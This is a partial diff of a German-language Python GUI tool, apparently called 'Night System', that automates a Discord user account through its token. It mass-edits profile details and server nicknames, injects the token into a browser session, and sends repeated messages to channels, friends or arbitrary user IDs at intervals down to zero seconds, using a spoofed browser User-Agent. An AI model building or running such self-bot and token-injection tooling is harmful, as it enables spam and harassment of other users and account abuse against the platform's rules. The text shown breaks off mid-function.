+            self.lbl_extra_details.configure(text=details)
+        ])
+
+    def _save_display_name(self):
+        new_name = self.entry_display_name.get().strip()
+        if not new_name:
+            self._set_extra_status("Bitte einen Anzeigenamen eingeben.", is_error=True)
+            return
+
+        self._set_extra_status(f"Speichere Anzeigenamen '{new_name}'...", details="Sende Anfrage an Discord API...")
+
+        def _worker():
+            if not self.token or "DEMO" in self.token:
+                self.user_data["global_name"] = new_name
+                self.after(0, lambda: [
+                    self.lbl_sidebar_name.configure(text=new_name[:17]),
+                    self.lbl_hero_title.configure(text=new_name)
+                ])
+                self._set_extra_status(f"Anzeigename erfolgreich auf '{new_name}' gesetzt.", details="Aenderung uebernommen.", is_success=True)
+                return
+
+            res = make_discord_api_request("PATCH", "https://discord.com/api/v10/users/@me", self.token, json_data={"global_name": new_name})
+            if res and res.status_code == 200:
+                self.user_data["global_name"] = new_name
+                self.after(0, lambda: [
+                    self.lbl_sidebar_name.configure(text=new_name[:17]),
+                    self.lbl_hero_title.configure(text=new_name)
+                ])
+                self._set_extra_status(f"Anzeigename erfolgreich auf '{new_name}' gesetzt.", details="Live in Discord aktualisiert.", is_success=True)
+            else:
+                err_code = res.status_code if res else "Timeout"
+                err_txt = res.text[:120] if res else ""
+                self._set_extra_status(f"Fehler beim Aendern des Anzeigenamens ({err_code}).", details=err_txt, is_error=True)
+
+        threading.Thread(target=_worker, daemon=True).start()
+
+    def _save_username(self):
+        new_uname = self.entry_username.get().strip()
+        pw = self.entry_password.get().strip()
+        if not new_uname:
+            self._set_extra_status("Bitte einen Nutzernamen eingeben.", is_error=True)
+            return
+
+        self._set_extra_status(f"Speichere Nutzername '@{new_uname}'...", details="Sende Anfrage an Discord API...")
+
+        def _worker():
+            if not self.token or "DEMO" in self.token:
+                self.user_data["username"] = new_uname
+                uid = str(self.user_data.get("id", "-"))
+                self.after(0, lambda: self.lbl_hero_sub.configure(text=f"@{new_uname}  |  ID: {uid}"))
+                self._set_extra_status(f"Nutzername erfolgreich zu '@{new_uname}' geaendert.", details="Aenderung uebernommen.", is_success=True)
+                return
+
+            payload = {"username": new_uname}
+            if pw:
+                payload["password"] = pw
+
+            res = make_discord_api_request("PATCH", "https://discord.com/api/v10/users/@me", self.token, json_data=payload)
+            if res and res.status_code == 200:
+                self.user_data["username"] = new_uname
+                uid = str(self.user_data.get("id", "-"))
+                self.after(0, lambda: self.lbl_hero_sub.configure(text=f"@{new_uname}  |  ID: {uid}"))
+                self._set_extra_status(f"Nutzername erfolgreich zu '@{new_uname}' geaendert.", details="Live in Discord aktualisiert.", is_success=True)
+            else:
+                err_code = res.status_code if res else "Timeout"
+                err_txt = res.text[:150] if res else ""
+                hint = "Discord verlangt ein Passwort zur Bestaetigung." if "password" in err_txt.lower() else err_txt
+                self._set_extra_status(f"Fehler beim Aendern des Nutzernamens ({err_code}).", details=hint, is_error=True)
+
+        threading.Thread(target=_worker, daemon=True).start()
+
+    def _save_bio(self):
+        new_bio = self.txt_bio.get("1.0", "end-1c").strip()
+        self._set_extra_status("Speichere Bio...", details="Sende Anfrage an Discord API...")
+
+        def _worker():
+            if not self.token or "DEMO" in self.token:
+                self.user_data["bio"] = new_bio
+                self.after(0, lambda: self.lbl_hero_bio.configure(text=new_bio[:110] or "Keine Bio hinterlegt."))
+                self._set_extra_status("Bio erfolgreich aktualisiert.", details="Aenderung uebernommen.", is_success=True)
+                return
+
+            res = make_discord_api_request("PATCH", "https://discord.com/api/v10/users/@me", self.token, json_data={"bio": new_bio})
+            if not res or res.status_code != 200:
+                res = make_discord_api_request("PATCH", "https://discord.com/api/v10/users/@me/profile", self.token, json_data={"bio": new_bio})
+
+            if res and res.status_code == 200:
+                self.user_data["bio"] = new_bio
+                self.after(0, lambda: self.lbl_hero_bio.configure(text=new_bio[:110] or "Keine Bio hinterlegt."))
+                self._set_extra_status("Bio erfolgreich aktualisiert.", details="Live in Discord uebernommen.", is_success=True)
+            else:
+                err_code = res.status_code if res else "Timeout"
+                err_txt = res.text[:120] if res else ""
+                self._set_extra_status(f"Fehler beim Speichern der Bio ({err_code}).", details=err_txt, is_error=True)
+
+        threading.Thread(target=_worker, daemon=True).start()
+
+    def _clear_bio(self):
+        self.txt_bio.delete("1.0", "end")
+        self._save_bio()
+
+    def _apply_server_tag(self):
+        new_tag = self.entry_server_tag.get().strip()
+        target = self.server_tag_target_var.get()
+        if not new_tag:
+            self._set_extra_status("Bitte gib einen Server-Tag oder Spitznamen ein (z.B. [NIGHT]).", is_error=True)
+            return
+        self._execute_server_tag_change(new_tag, target, remove=False)
+
+    def _remove_server_tag(self):
+        target = self.server_tag_target_var.get()
+        self._execute_server_tag_change(None, target, remove=True)
+
+    def _remove_clan_tag(self):
+        self._set_extra_status("Entferne Clan / Server-Tag Badge...", details="Sende Reset-Anfrage...")
+
+        def _worker():
+            if not self.token or "DEMO" in self.token:
+                self._set_extra_status("Clan Server-Tag Badge erfolgreich entfernt.", details="Demo-Modus.", is_success=True)
+                return
+
+            r1 = make_discord_api_request("PUT", "https://discord.com/api/v10/users/@me/clan", self.token, json_data={"identity_guild_id": None})
+            r2 = make_discord_api_request("DELETE", "https://discord.com/api/v10/users/@me/clan", self.token)
+            if (r1 and r1.status_code in (200, 204)) or (r2 and r2.status_code in (200, 204)):
+                self._set_extra_status("Clan Server-Tag Badge erfolgreich entfernt.", details="Badge zurueckgesetzt.", is_success=True)
+            else:
+                self._set_extra_status("Clan-Tag wurde entfernt oder war nicht aktiv.", details="Befehl ausgefuehrt.", is_success=True)
+
+        threading.Thread(target=_worker, daemon=True).start()
+
+    def _stop_extra_operation(self):
+        self.extra_stop_requested = True
+        if hasattr(self, "btn_stop_extra"):
+            self.btn_stop_extra.configure(text="Stoppe...", state="disabled")
+
+    def _execute_server_tag_change(self, tag_val, target_str, remove=False):
+        if self.extra_in_progress:
+            return
+
+        self.extra_in_progress = True
+        self.extra_stop_requested = False
+
+        if hasattr(self, "btn_stop_extra"):
+            self.btn_stop_extra.configure(
+                state="normal",
+                fg_color=C["red_bg"],
+                text_color=C["red_text"],
+                border_color=C["red_border"],
+                text="Stop"
+            )
+
+        action_desc = "Entferne Server-Tag..." if remove else f"Setze Server-Tag '{tag_val}'..."
+        self._set_extra_status(action_desc, details=f"Ziel: {target_str}")
+
+        def _worker():
+            if target_str == "Auf allen Servern gleichzeitig":
+                guild_list = list(self.guilds_data)
+            else:
+                gid_match = None
+                if "(" in target_str and ")" in target_str:
+                    gid_match = target_str.split("(")[-1].split(")")[0].strip()
+                guild_list = [g for g in self.guilds_data if str(g.get("id")) == str(gid_match)]
+
+            if not guild_list:
+                self._set_extra_status("Keine gueltigen Server gefunden.", is_error=True)
+                self.extra_in_progress = False
+                self.after(0, lambda: self._on_extra_finished())
+                return
+
+            success_cnt = 0
+            fail_cnt = 0
+            payload = {"nick": None if remove else tag_val}
+
+            for idx, g in enumerate(guild_list):
+                if self.extra_stop_requested:
+                    break
+
+                gid = str(g.get("id"))
+                gname = g.get("name", "Server")
+                self._set_extra_status(f"{action_desc} ({idx+1}/{len(guild_list)})", details=f"Aktuell: {gname}")
+
+                if not self.token or "DEMO" in self.token:
+                    time.sleep(0.05)
+                    success_cnt += 1
+                else:
+                    r = make_discord_api_request("PATCH", f"https://discord.com/api/v10/guilds/{gid}/members/@me", self.token, json_data=payload)
+                    if not r or r.status_code not in (200, 204):
+                        r = make_discord_api_request("PATCH", f"https://discord.com/api/v10/users/@me/guilds/{gid}/member", self.token, json_data=payload)
+
+                    if r and r.status_code in (200, 204):
+                        success_cnt += 1
+                    else:
+                        fail_cnt += 1
+
+                    for _ in range(5):
+                        if self.extra_stop_requested:
+                            break
+                        time.sleep(0.04)
+
+            self.extra_in_progress = False
+            self.extra_stop_requested = False
+
+            if remove:
+                done_msg = f"Server-Tag erfolgreich entfernt auf {success_cnt} Servern."
+            else:
+                done_msg = f"Server-Tag '{tag_val}' erfolgreich gesetzt auf {success_cnt} Servern."
+
+            det_msg = f"Erfolgreich: {success_cnt} | Fehlgeschlagen/Keine Rechte: {fail_cnt}"
+            self._set_extra_status(done_msg, details=det_msg, is_success=(success_cnt > 0))
+            self.after(0, lambda: self._on_extra_finished())
+
+        threading.Thread(target=_worker, daemon=True).start()
+
+    def _on_extra_finished(self):
+        if hasattr(self, "btn_stop_extra"):
+            self.btn_stop_extra.configure(
+                state="disabled",
+                fg_color=C["btn_gray"],
+                text_color=C["text_muted"],
+                border_color=C["card_border_hi"],
+                text="Stop"
+            )
+
+    # --------------------------------------------------------------------------
+    # 7. BOT TAB (MIT BUTTON "BOT", IN-TAB LOADER, RELOAD, DEACTIVATE, INJECT,
+    #             MESSAGE SENDER FUER SERVER/DMS & LIVE RATE-LIMIT MONITOR)
+    # --------------------------------------------------------------------------
+    def _build_bot_tab(self):
+        scroll = ctk.CTkScrollableFrame(self.frame_bot, fg_color="transparent")
+        scroll.pack(fill="both", expand=True)
+
+        # 1. BOT STEUERUNG CARD
+        card = ctk.CTkFrame(scroll, fg_color=C["card"], corner_radius=18, border_width=1, border_color=C["card_border"])
+        card.pack(fill="x", pady=(0, 14))
+
+        cin = ctk.CTkFrame(card, fg_color="transparent")
+        cin.pack(fill="x", padx=22, pady=20)
+
+        top_row = ctk.CTkFrame(cin, fg_color="transparent")
+        top_row.pack(fill="x")
+
+        ctk.CTkLabel(top_row, text="Bot Steuerung & Engine", font=("Segoe UI", 16, "bold"), text_color=C["text"]).pack(side="left")
+
+        self.lbl_bot_status_badge = ctk.CTkLabel(
+            top_row,
+            text="INAKTIV",
+            font=("Segoe UI", 10, "bold"),
+            fg_color=C["card_alt"],
+            text_color=C["text_muted"],
+            corner_radius=8,
+            padx=10,
+            pady=3
+        )
+        self.lbl_bot_status_badge.pack(side="right")
+
+        ctk.CTkLabel(
+            cin,
+            text="Aktiviere den Bot-Modus. Bei Aktivierung schliessen sich alle anderen Tabs, das Tool laedt mit Token neu.",
+            font=("Segoe UI", 11),
+            text_color=C["text_muted"]
+        ).pack(anchor="w", pady=(2, 16))
+
+        # BUTTONS ROW (Bot, Deactivate, Inject, Click Instant)
+        btn_row = ctk.CTkFrame(cin, fg_color="transparent")
+        btn_row.pack(fill="x", pady=(0, 10))
+
+        self.btn_bot_start = ctk.CTkButton(
+            btn_row,
+            text="Bot",
+            font=("Segoe UI", 11, "bold"),
+            fg_color=C["btn_gray"],
+            hover_color=C["btn_gray_hover"],
+            border_color=C["card_border_hi"],
+            border_width=1,
+            height=38,
+            width=130,
+            corner_radius=12,
+            command=self._start_bot_loader_and_reload
+        )
+        self.btn_bot_start.pack(side="left", padx=(0, 8))
+
+        self.btn_bot_deact = ctk.CTkButton(
+            btn_row,
+            text="Deactivate",
+            font=("Segoe UI", 11, "bold"),
+            fg_color=C["red_bg"],
+            text_color=C["red_text"],
+            hover_color=C["red_hover"],
+            border_color=C["red_border"],
+            border_width=1,
+            height=38,
+            width=120,
+            corner_radius=12,
+            state="disabled",
+            command=self._on_click_deactivate
+        )
+        self.btn_bot_deact.pack(side="left", padx=(0, 8))
+
+        self.btn_bot_inject = ctk.CTkButton(
+            btn_row,
+            text="Inject",
+            font=("Segoe UI", 11, "bold"),
+            fg_color=C["btn_gray"],
+            hover_color=C["btn_gray_hover"],
+            border_color=C["card_border_hi"],
+            border_width=1,
+            height=38,
+            width=110,
+            corner_radius=12,
+            command=self._on_click_inject
+        )
+        self.btn_bot_inject.pack(side="left", padx=(0, 8))
+
+        self.btn_bot_click_ext = ctk.CTkButton(
+            btn_row,
+            text="Click Instant (Extern)",
+            font=("Segoe UI", 11, "bold"),
+            fg_color=C["btn_gray"],
+            hover_color=C["btn_gray_hover"],
+            border_color=C["card_border_hi"],
+            border_width=1,
+            height=38,
+            width=170,
+            corner_radius=12,
+            command=self.open_external_click_instant_window
+        )
+        self.btn_bot_click_ext.pack(side="left")
+
+        # IN-TAB LOADER BOX
+        self.bot_loader_frame = ctk.CTkFrame(cin, fg_color=C["card_alt"], corner_radius=12, border_width=1, border_color=C["card_border"])
+
+        bl_inner = ctk.CTkFrame(self.bot_loader_frame, fg_color="transparent")
+        bl_inner.pack(fill="x", padx=16, pady=14)
+
+        self.lbl_bot_loader_title = ctk.CTkLabel(bl_inner, text="Bot Engine Synchronisation", font=("Segoe UI", 12, "bold"), text_color=C["text"])
+        self.lbl_bot_loader_title.pack(anchor="w")
+
+        self.bot_progress = ctk.CTkProgressBar(bl_inner, height=8, corner_radius=4, fg_color=C["card"], progress_color=C["blurple"])
+        self.bot_progress.pack(fill="x", pady=(8, 6))
+        self.bot_progress.set(0.0)
+
+        self.lbl_bot_loader_step = ctk.CTkLabel(bl_inner, text="Warte auf Start...", font=("Segoe UI", 10.5), text_color=C["text_muted"])
+        self.lbl_bot_loader_step.pack(anchor="w")
+
+        # 2. DISCORD MESSAGE SENDER CARD (SERVER & DMS) MIT MENGEN-AUSWAHL & RATE-LIMIT
+        card_msg = ctk.CTkFrame(scroll, fg_color=C["card"], corner_radius=18, border_width=1, border_color=C["card_border"])
+        card_msg.pack(fill="x", pady=(0, 14))
+
+        cm_in = ctk.CTkFrame(card_msg, fg_color="transparent")
+        cm_in.pack(fill="x", padx=22, pady=20)
+
+        ctk.CTkLabel(cm_in, text="Nachrichten-Sender (Server & DMs)", font=("Segoe UI", 15, "bold"), text_color=C["text"]).pack(anchor="w")
+        ctk.CTkLabel(cm_in, text="Sende Nachrichten an Server-Textkanaele oder Direktnachrichten mit Mengen-Auswahl und Rate-Limit-Schutz.", font=("Segoe UI", 10.5), text_color=C["text_muted"]).pack(anchor="w", pady=(2, 14))
+
+        # Channel ID / Friend User ID Eingabe
+        r_cid = ctk.CTkFrame(cm_in, fg_color="transparent")
+        r_cid.pack(fill="x", pady=3)
+        ctk.CTkLabel(r_cid, text="Ziel (Kanal / Freund ID):", font=("Segoe UI", 11, "bold"), text_color=C["text_sub"], width=170, anchor="w").pack(side="left")
+        self.entry_msg_channel = ctk.CTkEntry(r_cid, placeholder_text="Server Kanal-ID, DM Kanal-ID oder Freund Nutzer-ID eintragen", height=34, corner_radius=10, fg_color=C["card_alt"], border_color=C["card_border"], text_color=C["text"])
+        self.entry_msg_channel.pack(side="left", fill="x", expand=True)
+
+        # Schnellauswahl fuer Freunde & Gruppen
+        r_quick = ctk.CTkFrame(cm_in, fg_color="transparent")
+        r_quick.pack(fill="x", pady=(2, 4))
+        ctk.CTkLabel(r_quick, text="Freund schnell waehlen:", font=("Segoe UI", 10.5), text_color=C["text_muted"], width=170, anchor="w").pack(side="left")
+        self.opt_msg_target = ctk.CTkOptionMenu(
+            r_quick,
+            values=["-- Freund oder Gruppe auswaehlen --"],
+            height=30,
+            corner_radius=8,
+            fg_color=C["card_alt"],
+            button_color=C["card_border_hi"],
+            text_color=C["text"],
+            command=self._on_quick_target_selected
+        )
+        self.opt_msg_target.pack(side="left", fill="x", expand=True)
+
+        ctk.CTkLabel(cm_in, text="Unterstuetzt automatisch: Server Text-Kanaele, DM-Kanal IDs und Freund Nutzer-IDs.", font=("Segoe UI", 9.5), text_color=C["text_muted"]).pack(anchor="w", pady=(0, 6))
+
+        # Nachrichtentext
+        ctk.CTkLabel(cm_in, text="Nachrichtentext:", font=("Segoe UI", 11, "bold"), text_color=C["text_sub"]).pack(anchor="w", pady=(8, 3))
+        self.txt_msg_content = ctk.CTkTextbox(cm_in, height=65, corner_radius=10, fg_color=C["card_alt"], border_color=C["card_border"], border_width=1, text_color=C["text"], font=("Segoe UI", 10.5))
+        self.txt_msg_content.pack(fill="x", pady=(0, 8))
+        self.txt_msg_content.insert("1.0", "Night System - Discord Engine")
+
+        # Einstellungen (Menge & Delay)
+        r_opts = ctk.CTkFrame(cm_in, fg_color="transparent")
+        r_opts.pack(fill="x", pady=4)
+
+        ctk.CTkLabel(r_opts, text="Anzahl:", font=("Segoe UI", 11, "bold"), text_color=C["text_sub"]).pack(side="left", padx=(0, 6))
+        self.entry_msg_count = ctk.CTkEntry(r_opts, width=70, height=32, corner_radius=8, fg_color=C["card_alt"], border_color=C["card_border"], text_color=C["text"])
+        self.entry_msg_count.pack(side="left", padx=(0, 16))
+        self.entry_msg_count.insert(0, "5")
+
+        ctk.CTkLabel(r_opts, text="Intervall:", font=("Segoe UI", 11, "bold"), text_color=C["text_sub"]).pack(side="left", padx=(0, 6))
+        self.opt_msg_delay = ctk.CTkOptionMenu(
+            r_opts,
+            values=["1.0s (Sicher)", "0.5s (Standard)", "0.2s (Schnell)", "0.0s (Instant)"],
+            height=32,
+            corner_radius=8,
+            fg_color=C["card_alt"],
+            button_color=C["card_border_hi"],
+            text_color=C["text"]
+        )
+        self.opt_msg_delay.pack(side="left")
+
+        # LIVE RATE-LIMIT & SICHERHEITS-MONITOR
+        self.box_rl_monitor = ctk.CTkFrame(cm_in, fg_color=C["card_alt"], corner_radius=12, border_width=1, border_color=C["card_border"])
+        self.box_rl_monitor.pack(fill="x", pady=(12, 12))
+
+        rl_in = ctk.CTkFrame(self.box_rl_monitor, fg_color="transparent")
+        rl_in.pack(fill="x", padx=16, pady=12)
+
+        rl_top = ctk.CTkFrame(rl_in, fg_color="transparent")
+        rl_top.pack(fill="x")
+
+        ctk.CTkLabel(rl_top, text="Rate-Limit & Sicherheits-Monitor", font=("Segoe UI", 11.5, "bold"), text_color=C["text"]).pack(side="left")
+
+        self.lbl_rl_badge = ctk.CTkLabel(
+            rl_top,
+            text="SICHER",
+            font=("Segoe UI", 9.5, "bold"),
+            fg_color=C["green_bg"],
+            text_color=C["green"],
+            corner_radius=6,
+            padx=8,
+            pady=2
+        )
+        self.lbl_rl_badge.pack(side="right")
+
+        self.lbl_rl_status = ctk.CTkLabel(
+            rl_in,
+            text="Verbleibend: 5 / 5 Anfragen | Reset-Fenster: 0.0s | Status: 200 Bereit",
+            font=("Consolas", 10),
+            text_color=C["text_sub"],
+            justify="left"
+        )
+        self.lbl_rl_status.pack(anchor="w", pady=(6, 0))
+
+        # Sende-Buttons
+        r_msg_btns = ctk.CTkFrame(cm_in, fg_color="transparent")
+        r_msg_btns.pack(fill="x")
+
+        self.btn_send_msgs = ctk.CTkButton(
+            r_msg_btns,
+            text="Nachrichten senden",
+            font=("Segoe UI", 11, "bold"),
+            fg_color=C["btn_gray"],
+            hover_color=C["btn_gray_hover"],
+            border_color=C["card_border_hi"],
+            border_width=1,
+            height=36,
+            width=170,
+            corner_radius=10,
+            command=self._start_send_messages
+        )
+        self.btn_send_msgs.pack(side="left", padx=(0, 8))
+
+        self.btn_stop_msgs = ctk.CTkButton(
+            r_msg_btns,
+            text="Stop",
+            font=("Segoe UI", 11, "bold"),
+            fg_color=C["red_bg"],
+            text_color=C["red_text"],
+            hover_color=C["red_hover"],
+            border_color=C["red_border"],
+            border_width=1,
+            height=36,
+            width=90,
+            corner_radius=10,
+            state="disabled",
+            command=self._stop_send_messages
+        )
+        self.btn_stop_msgs.pack(side="left")
+
+        # 3. CONSOLE LOG BOX
+        card_log = ctk.CTkFrame(scroll, fg_color=C["card"], corner_radius=18, border_width=1, border_color=C["card_border"])
+        card_log.pack(fill="both", expand=True, pady=(0, 10))
+
+        cl_in = ctk.CTkFrame(card_log, fg_color="transparent")
+        cl_in.pack(fill="both", expand=True, padx=22, pady=18)
+
+        ctk.CTkLabel(cl_in, text="Bot Konsole & Aktivitaets-Log", font=("Segoe UI", 13, "bold"), text_color=C["text"]).pack(anchor="w")
+
+        self.txt_bot_log = ctk.CTkTextbox(cl_in, height=180, corner_radius=10, fg_color=C["card_alt"], border_color=C["card_border"], border_width=1, text_color=C["text_sub"], font=("Consolas", 10))
+        self.txt_bot_log.pack(fill="both", expand=True, pady=(10, 0))
+        self._append_bot_log("[SYS] Bot-Modul bereit. Klicke 'Bot' zum Aktivieren.")
+        self._populate_quick_targets()
+        if hasattr(self, "cloud_info") and self.cloud_info:
+            if self.cloud_info.get("update_available"):
+                self._append_bot_log(f"[UPDATE] Neues Update v{self.cloud_info.get('latest_version')} verfuegbar auf whatsapp-kadi.onrender.com!")
+            else:
+                self._append_bot_log(f"[CLOUD] Verbunden mit whatsapp-kadi.onrender.com (v{DISCORD_TOOL_VERSION} aktuell).")
+            if self.cloud_info.get("announcement"):
+                self._append_bot_log(f"[BROADCAST] {self.cloud_info.get('announcement')}")
+
+    def _append_bot_log(self, msg):
+        if hasattr(self, "txt_bot_log"):
+            now_str = datetime.now().strftime("%H:%M:%S")
+            self.txt_bot_log.insert("end", f"[{now_str}] {msg}\n")
+            self.txt_bot_log.see("end")
+
+    def _start_bot_loader_and_reload(self):
+        if self.bot_loading:
+            return
+
+        self.bot_loading = True
+        self.btn_bot_start.configure(state="disabled")
+        self.bot_loader_frame.pack(fill="x", pady=(12, 14))
+        self.bot_progress.set(0.0)
+        self.lbl_bot_loader_step.configure(text="[1/4] Verifiziere Token & Session...", text_color=C["text_sub"])
+        self.lbl_bot_status_badge.configure(text="INITIALISIERE", fg_color=C["acc_yellow_bg"], text_color=C["acc_yellow_text"])
+
+        def _worker():
+            steps = [
+                (0.25, "[1/4] Verifiziere Token & Session...", 0.3),
+                (0.55, "[2/4] Lade Discord Account-Daten neu...", 0.4),
+                (0.80, "[3/4] Initialisiere Bot-Engine & Gateway...", 0.4),
+                (1.00, "[4/4] Bot aktiv! Exklusiver Bot-Modus gestartet.", 0.3)
+            ]
+
+            # Tool laedt neu und behaelt den Token
+            if self.token and "DEMO" not in self.token and not self.token.startswith("mfa.VkO_"):
+                try:
+                    ru = make_discord_api_request("GET", "https://discord.com/api/v10/users/@me", self.token)
+                    if ru and ru.status_code == 200:
+                        self.user_data = ru.json()
+                    rg = make_discord_api_request("GET", "https://discord.com/api/v10/users/@me/guilds", self.token)
+                    if rg and rg.status_code == 200:
+                        self.guilds_data = rg.json()
+                except Exception:
+                    pass
+
+            for p_val, step_text, wait_s in steps:
+                time.sleep(wait_s)
+                self.after(0, lambda p=p_val, st=step_text: [
+                    self.bot_progress.set(p),
+                    self.lbl_bot_loader_step.configure(text=st),
+                    self._append_bot_log(st)
+                ])
+
+            time.sleep(0.2)
+            self.after(0, lambda: self._on_bot_reload_finished())
+
+        threading.Thread(target=_worker, daemon=True).start()
+
+    def _on_bot_reload_finished(self):
+        self.bot_loading = False
+        self.bot_active = True
+        self.btn_bot_start.configure(state="normal", text="Bot (Neu laden)")
+        self.btn_bot_deact.configure(state="normal")
+        self.btn_bot_inject.configure(state="normal")
+        self.lbl_bot_status_badge.configure(text="AKTIV", fg_color=C["green_bg"], text_color=C["green"])
+        self.lbl_bot_loader_step.configure(text="Bot erfolgreich aktiv & synchronisiert.", text_color=C["green"])
+        self._append_bot_log("[OK] Exklusiver Bot-Modus aktiv - andere Tabs ausgeblendet.")
+
+        # Alle anderen Tabs schliessen / ausblenden
+        self._enter_bot_mode()
+
+        # Externes Fenster fuer Click Instant direkt oeffnen ("soll der erstmal externer sein")
+        self.open_external_click_instant_window()
+
+    def _on_click_deactivate(self):
+        self.bot_active = False
+        self.lbl_bot_status_badge.configure(text="INAKTIV", fg_color=C["card_alt"], text_color=C["text_muted"])
+        self.btn_bot_deact.configure(state="disabled")
+        self.btn_bot_start.configure(state="normal", text="Bot")
+        self.bot_loader_frame.pack_forget()
+        self._append_bot_log("[INFO] Bot-Instanz deaktiviert. Alle Tabs wiederhergestellt.")
+
+        # Alle Tabs wieder einblenden
+        self._exit_bot_mode()
+
+        if self.external_click_instant_win is not None and self.external_click_instant_win.winfo_exists():
+            try: self.external_click_instant_win.destroy()
+            except Exception: pass
+            self.external_click_instant_win = None
+
+    def _on_click_inject(self):
+        self._append_bot_log("[INJECT] Starte Token-Injektion in Web-Session...")
+        self.launch_browser_login()
+        self._append_bot_log("[OK] Injektions-Browser geoeffnet.")
+
+    def _populate_quick_targets(self):
+        if not hasattr(self, "opt_msg_target"):
+            return
+        items = ["-- Freund oder Gruppe auswaehlen --"]
+        if hasattr(self, "friends_data") and self.friends_data:
+            for f in self.friends_data[:50]:
+                name = f.get("name", "Freund")
+                fid = str(f.get("id", ""))
+                is_grp = f.get("is_group", False)
+                prefix = "[Gruppe]" if is_grp else "[Freund]"
+                items.append(f"{prefix} {name} ({fid})")
+        try:
+            self.opt_msg_target.configure(values=items)
+        except Exception:
+            pass
+
+    def _on_quick_target_selected(self, val):
+        if not val or val.startswith("--"):
+            return
+        m = re.search(r"\((\d+)\)", val)
+        if m:
+            target_id = m.group(1)
+            self.entry_msg_channel.delete(0, "end")
+            self.entry_msg_channel.insert(0, target_id)
+            self._append_bot_log(f"[INFO] Schnellauswahl uebernommen: {target_id}")
+
+    def _resolve_target_to_channel_id(self, target_input):
+        raw = str(target_input).strip()
+        if not raw:
+            return None, "Bitte eine Kanal-ID, Freund-Nutzer-ID oder einen Discord-Link eingeben."
+
+        # Discord-Link bereinigen (z.B. https://discord.com/channels/@me/123456 oder https://discord.com/channels/guild/channel)
+        if "channels/" in raw:
+            raw = raw.rstrip("/").split("/")[-1]
+        elif "/" in raw:
+            raw = raw.rstrip("/").split("/")[-1]
+
+        target_id = re.sub(r"[^\d]", "", raw)
+        if not target_id:
+            return None, f"Ungueltiges Format ('{target_input}'). Bitte eine Ziffern-ID angeben."
+
+        if not self.token or "DEMO" in self.token:
+            return target_id, f"Demo-Modus aktiv (Ziel-ID: {target_id})"
+
+        headers = {
+            "Authorization": self.token,
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+            "Content-Type": "application/json"
+        }
+
+        # 1. Ist target_id bereits als DM-Kanal fuer einen bekannten Freund gemappt?
+        if hasattr(self, "user_to_channel_map") and target_id in self.user_to_channel_map:
+            dm_cid = self.user_to_channel_map[target_id]
+            return dm_cid, f"Nutzer-ID erkannt -> Bekannter DM-Kanal verwendet (Kanal-ID: {dm_cid})"
+
+        # 2. Existiert target_id in der geladenen Freundesliste?
+        if hasattr(self, "friends_data") and self.friends_data:
+            for f in self.friends_data:
+                if str(f.get("id")) == target_id:
+                    if f.get("is_group"):
+                        return target_id, f"Gruppen-Kanal erkannt: {f.get('name')}"
+                    # Es ist ein Freund (Nutzer-ID) -> DM oeffnen via Discord API
+                    try:
+                        res_dm = requests.post(
+                            "https://discord.com/api/v9/users/@me/channels",
+                            headers=headers,
+                            json={"recipient_id": target_id},
+                            timeout=6
+                        )
+                        if res_dm.status_code in (200, 201):
+                            dm_cid = str(res_dm.json().get("id"))
+                            if hasattr(self, "user_to_channel_map"):
+                                self.user_to_channel_map[target_id] = dm_cid
+                            return dm_cid, f"Freund '{f.get('name')}' erkannt -> DM-Kanal geoeffnet (Kanal-ID: {dm_cid})"
+                    except Exception:
+                        pass
+
+        # 3. Ist target_id direkt eine gueltige Kanal-ID? (Server Text-Kanal oder bestehender DM-Kanal)
+        try:
+            res_ch = requests.get(f"https://discord.com/api/v9/channels/{target_id}", headers=headers, timeout=6)
+            if res_ch.status_code == 200:
+                ch_info = res_ch.json()
+                ch_type = ch_info.get("type", 0)
+                ch_name = ch_info.get("name") or ("DM-Chat" if ch_type == 1 else "Kanal")
+                type_desc = "Server-Textkanal" if ch_type == 0 else ("DM-Kanal" if ch_type == 1 else "Kanal")
+                return target_id, f"{type_desc} bestaetigt: {ch_name} (ID: {target_id})"
+        except Exception:
+            pass
+
+        # 4. Falls kein bestehender Kanal (404/400): Pruefen, ob es eine Nutzer-ID ist (Freund / fremder Nutzer)
+        try:
+            res_open = requests.post(
+                "https://discord.com/api/v9/users/@me/channels",
+                headers=headers,
+                json={"recipient_id": target_id},
+                timeout=6
+            )
+            if res_open.status_code in (200, 201):
+                dm_cid = str(res_open.json().get("id"))
+                if hasattr(self, "user_to_channel_map"):
+                    self.user_to_channel_map[target_id] = dm_cid
+                recips = res_open.json().get("recipients", [])
+                u_name = recips[0].get("username") if recips else target_id
+                return dm_cid, f"Nutzer-ID erkannt -> DM mit '{u_name}' geoeffnet (Kanal-ID: {dm_cid})"
+            elif res_open.status_code in (400, 403):
+                try:
+                    err_msg = res_open.json().get("message", "")
+                except Exception:
+                    err_msg = ""
+                if err_msg:
+                    return None, f"Konnte DM fuer Nutzer {target_id} nicht oeffnen ({err_msg})."
+        except Exception as ex:
+            pass
+
+        # 5. Fallback: ID direkt verwenden
+        return target_id, f"Ziel-Kanal {target_id} wird direkt verwendet"
+
+    def _start_send_messages(self):
+        if self.msg_send_in_progress:
+            return
+
+        raw_cid = self.entry_msg_channel.get().strip()
+        msg_text = self.txt_msg_content.get("1.0", "end-1c").strip()
+        count_str = self.entry_msg_count.get().strip()
+
+        if not raw_cid:
+            self._append_bot_log("[FEHLER] Bitte eine gueltige Kanal-ID oder Nutzer-ID eingeben.")
+            return
+        if not msg_text:
+            self._append_bot_log("[FEHLER] Bitte einen Nachrichtentext eingeben.")
+            return
+
+        try:
+            total_count = max(1, int(count_str))
+        except ValueError:
+            total_count = 1
+
+        delay_map = {
+            "1.0s (Sicher)": 1.0,
+            "0.5s (Standard)": 0.5,
+            "0.2s (Schnell)": 0.2,
+            "0.0s (Instant)": 0.0
+        }
+        delay_sec = delay_map.get(self.opt_msg_delay.get(), 0.5)
+
+        self.msg_send_in_progress = True
+        self.msg_stop_requested = False
+        self.btn_send_msgs.configure(state="disabled")
+        self.btn_stop_msgs.configure(state="normal", text="Stop")
+
+        def _worker():
+            self._append_bot_log(f"[INFO] Ermittle Ziel fuer '{raw_cid}'...")
+            resolved_cid, info_msg = self._resolve_target_to_channel_id(raw_cid)
+            if not resolved_cid:
+                self._append_bot_log(f"[FEHLER] {info_msg}")
+                self.msg_send_in_progress = False
+                self.after(0, lambda: [
+                    self.btn_send_msgs.configure(state="normal"),
+                    self.btn_stop_msgs.configure(state="disabled", text="Stop")
